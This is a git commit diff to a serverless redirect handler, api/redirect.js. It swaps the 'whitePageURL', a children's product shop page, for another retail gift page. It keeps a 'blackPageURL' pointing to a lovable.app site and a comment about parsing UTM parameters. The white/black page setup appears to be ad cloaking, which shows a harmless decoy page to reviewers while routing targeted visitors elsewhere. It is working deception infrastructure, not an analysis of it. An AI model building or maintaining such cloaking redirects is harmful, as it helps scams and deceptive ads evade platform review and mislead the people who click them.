28b576538dcde62815f8574ca4e4d2fd93a26472
ahmadfarhanwork <ahmadfarhanwork@gmail.com>
2025-10-15 03:44:48 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.lilliputiens.com/en/i-m-exploring-12-24m/362-my-first-farm-86791.html";
+    const whitePageURL = "https://www.bunchesbaskets.es/gifts/hat-box-for-newborn";
     const blackPageURL = "https://nowhereher.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
